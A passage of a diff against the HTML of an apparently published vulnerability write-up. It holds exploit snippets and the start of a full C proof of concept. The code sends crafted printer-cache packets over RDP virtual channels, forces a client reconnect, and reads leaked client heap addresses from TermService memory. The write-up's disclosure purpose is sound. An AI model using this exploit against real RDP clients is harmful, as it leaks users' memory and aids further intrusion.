-  write_to_virtual_channel(leak_heap, <span style="color:#66d9ef">sizeof</span>(leak_heap));
-  Sleep(<span style="color:#ae81ff">200</span>);
-}
-</code></pre></div><p>At this point, the client&rsquo;s registry should be filled with memory leaks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>HANDLE virtual_channel <span style="color:#f92672">=</span> WTSVirtualChannelOpenEx(
+</span></span><span style="display:flex;"><span>  WTS_CURRENT_SESSION,
+</span></span><span style="display:flex;"><span>  channel_name,
+</span></span><span style="display:flex;"><span>  is_dynamic <span style="color:#f92672">?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Then, we can write to the channel handle this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>WTSVirtualChannelWrite(
+</span></span><span style="display:flex;"><span>  virtual_channel,
+</span></span><span style="display:flex;"><span>  buffer,
+</span></span><span style="display:flex;"><span>  (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)length,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>bytes_written
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p><strong>Repeat the writing</strong> enough times to increase probability of leaking interesting stuff and we&rsquo;re done with the first steps.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; k<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  write_to_virtual_channel(leak_heap, <span style="color:#66d9ef">sizeof</span>(leak_heap));
+</span></span><span style="display:flex;"><span>  Sleep(<span style="color:#ae81ff">200</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>At this point, the client&rsquo;s registry should be filled with memory leaks.</p>
 <p>Next step, we send garbage to the <code>Graphics</code> dynamic channel to <strong>make the client reconnect</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">connect_to_virtual_channel(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, DYNAMIC_CHANNEL);
-write_to_virtual_channel(<span style="color:#e6db74">&#34;fuzzed up beyond all repair&#34;</span>, <span style="color:#ae81ff">27</span>);
-close_virtual_channel();
-
-<span style="color:#75715e">// Wait for the client to reconnect
-</span><span style="color:#75715e"></span>Sleep(<span style="color:#ae81ff">20000</span>);
-</code></pre></div><p>This behavior is a bit random. Sometimes it will automatically reconnect the client, sometimes it will bring the client back to the connection window (without restarting the process) and they will have to click &ldquo;Connect&rdquo; again. There are probably other better ways to achieve that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, DYNAMIC_CHANNEL);
+</span></span><span style="display:flex;"><span>write_to_virtual_channel(<span style="color:#e6db74">&#34;fuzzed up beyond all repair&#34;</span>, <span style="color:#ae81ff">27</span>);
+</span></span><span style="display:flex;"><span>close_virtual_channel();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Wait for the client to reconnect
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Sleep(<span style="color:#ae81ff">20000</span>);
+</span></span></code></pre></div><p>This behavior is a bit random. Sometimes it will automatically reconnect the client, sometimes it will bring the client back to the connection window (without restarting the process) and they will have to click &ldquo;Connect&rdquo; again. There are probably other better ways to achieve that.</p>
 <p>As for the &ldquo;wait for the client to reconnect&rdquo; part, my POC merely sleeps but it could also do better by monitoring when the client exactly reconnects.</p>
 <p>The <strong>final step</strong> is to <strong>retrieve the leak</strong> sent by the client. I struggled with this part because I could not simply read from the virtual channel using <code>WTSVirtualChannelRead</code>. In order to read from a virtual channel, you need a handle to it, that you got from opening it.</p>
 <p>The fact that the PDU is sent upon first initialization of the RDPDR channel, which happens very early when the client connects to the server, complicates things a bit. You need to achieve some kind of race condition to open and read from the channel right after the client connects and sends the packet, but also right before the (real) server itself connects to the channel and handles the packet? I wasn&rsquo;t sure how it&rsquo;d work so I decided to look for another way.</p>
@@ -456,290 +456,290 @@ close_virtual_channel();
 <li>2021-11-09 &mdash; Microsoft released the security patch.</li>
 </ul>
 <h1 id="full-proof-of-concept-source-code">Full Proof-of-Concept source code</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
-</span><span style="color:#75715e">Compilation: clang poc.c -o poc.exe -l wsock32 -l wtsapi32 -l advapi32
-</span><span style="color:#75715e">Run as SYSTEM.
-</span><span style="color:#75715e">*/</span>
-
-<span style="color:#75715e">#define _CRT_SECURE_NO_WARNINGS
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;io.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winsock2.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winsvc.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wtsapi32.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define MAX_VC_WRITE_TRIES 20
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define STATIC_CHANNEL 0
-</span><span style="color:#75715e">#define DYNAMIC_CHANNEL 1
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> vtable_offsets[] <span style="color:#f92672">=</span> {
-    <span style="color:#75715e">// 10.0.19041.844
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x5c88e0</span>, <span style="color:#75715e">// const CTSMsg::`vftable`
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x5c92d8</span>, <span style="color:#75715e">// const CMemory::`vftable`{for `CImplIUknown&lt;struct IUnknown&gt;`}
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// 10.0.21354.1
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62c048</span>, <span style="color:#75715e">// const CFileRedirector::`vftable&#39;{for `INonDelegatingUnknown&#39;}
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62c1b8</span>, <span style="color:#75715e">// const CTSSyncWaitResult::`vftable&#39;{for `INonDelegatingUnknown&#39;}
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62c238</span>, <span style="color:#75715e">// const CTSMsg::`vftable&#39;{for `CTSObject&#39;}
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62dc20</span>, <span style="color:#75715e">// const CTSPooledUnknown::`vftable&#39;{for `INonDelegatingUnknown&#39;}
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62de48</span>  <span style="color:#75715e">// const CMemory::`vftable&#39;{for `CImplIUnknown&lt;struct IUnknown&gt;&#39;}
-</span><span style="color:#75715e"></span>};
-
-HANDLE rdp_server;
-HANDLE virtual_channel;
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int</span> length)
-{
-    printf(<span style="color:#e6db74">&#34;[+] &#34;</span>);
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> length; i<span style="color:#f92672">++</span>)
-    {
-        printf(<span style="color:#e6db74">&#34;%02x &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)buffer[i]);
-    }
-    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-}
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hook_to_rdp</span>()
-{
-    rdp_server <span style="color:#f92672">=</span> WTSOpenServerA(<span style="color:#e6db74">&#34;localhost&#34;</span>);
-    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>rdp_server)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Could not open RDP server handle. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-        exit(<span style="color:#ae81ff">1</span>);
-    }
-    printf(<span style="color:#e6db74">&#34;[+] Hooked to local RDP server.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
-}
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">connect_to_virtual_channel</span>(<span style="color:#66d9ef">char</span> channel_name[], <span style="color:#66d9ef">int</span> n_tries, <span style="color:#66d9ef">int</span> channel_type)
-{
-    printf(<span style="color:#e6db74">&#34;[+] Attempting to open Virtual Channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-
-    <span style="color:#66d9ef">int</span> tries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
-    {
-        tries<span style="color:#f92672">++</span>;
-        <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">&gt;=</span> n_tries)
-        {
-            <span style="color:#66d9ef">break</span>;
-        }
-        virtual_channel <span style="color:#f92672">=</span> WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, channel_name, channel_type <span style="color:#f92672">==</span> DYNAMIC_CHANNEL <span style="color:#f92672">?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style="color:#ae81ff">0</span>);
-        <span style="color:#66d9ef">if</span> (virtual_channel)
-        {
-            <span style="color:#66d9ef">break</span>;
-        }
-        Sleep(<span style="color:#ae81ff">1000</span>);
-    }
-
-    <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">==</span> n_tries)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Couldn&#39;t open Virtual Channel &#39;%s&#39; in %d tries. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries, GetLastError());
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    printf(<span style="color:#e6db74">&#34;[+] Opened Virtual Channel &#39;%s&#39; in %d tries.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries);
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-}
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">write_to_virtual_channel</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int</span> length)
-{
-    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bytes_written;
-    <span style="color:#66d9ef">int</span> tries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-
-    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
-    {
-        tries<span style="color:#f92672">++</span>;
-        <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">&gt;=</span> MAX_VC_WRITE_TRIES)
-        {
-            <span style="color:#66d9ef">break</span>;
-        }
-
-        <span style="color:#66d9ef">if</span> (WTSVirtualChannelWrite(virtual_channel, buffer, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)length, <span style="color:#f92672">&amp;</span>bytes_written))
-        {
-            <span style="color:#66d9ef">break</span>;
-        }
-        Sleep(<span style="color:#ae81ff">500</span>);
-    }
-
-    <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">==</span> MAX_VC_WRITE_TRIES)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Could not write to Virtual Channel. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    printf(<span style="color:#e6db74">&#34;[+] Successfully wrote %lu bytes to Virtual Channel.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_written);
-    hexdump(buffer, length);
-
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-}
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_virtual_channel</span>()
-{
-    printf(<span style="color:#e6db74">&#34;[+] Closing Virtual Channel.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
-    WTSVirtualChannelClose(virtual_channel);
-    CloseHandle(virtual_channel);
-}
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_rdp</span>()
-{
-    printf(<span style="color:#e6db74">&#34;[+] Closing RDP handle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    WTSCloseServer(rdp_server);
-    CloseHandle(rdp_server);
-}
-
-DWORD <span style="color:#a6e22e">get_termservice_pid</span>()
-{
-    DWORD bytesNeeded, servicesNum, lastError, pid;
-    <span style="color:#66d9ef">char</span> serviceName[<span style="color:#ae81ff">256</span>];
-    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-
-    SC_HANDLE manager <span style="color:#f92672">=</span> OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
-    <span style="color:#66d9ef">if</span> (manager <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Could not open manager. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    BOOL status <span style="color:#f92672">=</span> EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
-    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status <span style="color:#f92672">&amp;&amp;</span> (lastError <span style="color:#f92672">=</span> GetLastError()) <span style="color:#f92672">!=</span> ERROR_MORE_DATA)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastError);
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-    PBYTE lpBytes <span style="color:#f92672">=</span> (PBYTE)malloc(bytesNeeded);
-    status <span style="color:#f92672">=</span> EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, lpBytes, bytesNeeded, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
-    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-        free(lpBytes);
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    ENUM_SERVICE_STATUS_PROCESS <span style="color:#f92672">*</span>lpServiceStatus <span style="color:#f92672">=</span> (ENUM_SERVICE_STATUS_PROCESS <span style="color:#f92672">*</span>)lpBytes;
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> servicesNum; i<span style="color:#f92672">++</span>)
-    {
-        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>strcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)lpServiceStatus[i].lpServiceName, <span style="color:#e6db74">&#34;TermService&#34;</span>))
-        {
-            pid <span style="color:#f92672">=</span> lpServiceStatus[i].ServiceStatusProcess.dwProcessId;
-            printf(<span style="color:#e6db74">&#34;[+] Found TermService (PID %lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
-            free(lpBytes);
-            <span style="color:#66d9ef">return</span> pid;
-        }
-    }
-
-    printf(<span style="color:#e6db74">&#34;[x] Could not find TermService.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    free(lpBytes);
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-}
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
-{
-    DWORD svchostPid;
-    HANDLE hProcess;
-    MEMORY_BASIC_INFORMATION info;
-    SIZE_T bytesRead;
-    LPVOID buffer;
-    BYTE <span style="color:#f92672">*</span>leak;
-
-    <span style="color:#66d9ef">char</span> leak_heap[] <span style="color:#f92672">=</span> {
-        <span style="color:#75715e">// DR_PRN_ADD_CACHEDATA
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x50</span>,                         <span style="color:#75715e">// Header
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// EventId
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// PortDosName
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PnpNameLen
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// DriverNameLen
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PrintNameLen
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// CachedFieldsLen
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">// DriverName
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>,
-        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
-        <span style="color:#75715e">// PrinterName
-</span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>,
-        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x64</span>};
-
-    hook_to_rdp();
-
-    <span style="color:#75715e">// Connect to RDPDR channel
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;rdpdr&#34;</span>, <span style="color:#ae81ff">10</span>, STATIC_CHANNEL))
-    {
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-    }
-
-    <span style="color:#75715e">// Add Printer Cachedata to client registry, several times to increase probability of success
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; k<span style="color:#f92672">++</span>)
-    {
-        write_to_virtual_channel(leak_heap, <span style="color:#66d9ef">sizeof</span>(leak_heap));
-        Sleep(<span style="color:#ae81ff">200</span>);
-    }
-
-    <span style="color:#75715e">// Close RDPDR channel
-</span><span style="color:#75715e"></span>    close_virtual_channel();
-
-    <span style="color:#75715e">// Trick the client into reconnecting by corrupting the Graphics channel
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Sometimes it reconnects automatically, sometimes it requires manual action...
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, <span style="color:#ae81ff">10</span>, DYNAMIC_CHANNEL))
-    {
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-    }
-    write_to_virtual_channel(<span style="color:#e6db74">&#34;fuzzed up beyond all repair&#34;</span>, <span style="color:#ae81ff">27</span>);
-    close_virtual_channel();
-
-    <span style="color:#75715e">// Wait for the client to reconnect
-</span><span style="color:#75715e"></span>    Sleep(<span style="color:#ae81ff">20000</span>);
-
-    <span style="color:#75715e">// The client will send a Device List Announcement upon initialization
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve the Device List Announcement (DR_PRN_DEVICE_ANNOUNCE) from svchost memory
-</span><span style="color:#75715e"></span>
-    svchostPid <span style="color:#f92672">=</span> get_termservice_pid();
-    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>svchostPid)
-    {
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-    }
-
-    hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_READ <span style="color:#f92672">|</span> PROCESS_QUERY_INFORMATION, <span style="color:#ae81ff">0</span>, svchostPid);
-    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess)
-    {
-        printf(<span style="color:#e6db74">&#34;[x] Could not open svchost process. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-    }
-
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> NULL; VirtualQueryEx(hProcess, p, <span style="color:#f92672">&amp;</span>info, <span style="color:#66d9ef">sizeof</span>(info)); p <span style="color:#f92672">+=</span> info.RegionSize)
-    {
-        <span style="color:#66d9ef">if</span> (info.State <span style="color:#f92672">==</span> MEM_COMMIT <span style="color:#f92672">&amp;&amp;</span> info.Protect <span style="color:#f92672">!=</span> PAGE_NOACCESS <span style="color:#f92672">&amp;&amp;</span> info.Protect <span style="color:#f92672">!=</span> PAGE_GUARD)
-        {
-            buffer <span style="color:#f92672">=</span> malloc(info.RegionSize);
-            ReadProcessMemory(hProcess, info.BaseAddress, buffer, info.RegionSize, <span style="color:#f92672">&amp;</span>bytesRead);
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>)
-            {
-                leak <span style="color:#f92672">=</span> (BYTE <span style="color:#f92672">*</span>)buffer <span style="color:#f92672">+</span> i;
-                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>memcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)leak, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Brother&#34;</span>, <span style="color:#ae81ff">14</span>))
-                {
-                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; j<span style="color:#f92672">++</span>)
-                    {
-                        <span style="color:#66d9ef">if</span> (leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7f</span>)
-                        {
-                            printf(<span style="color:#e6db74">&#34;[+] Found address leak! 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)));
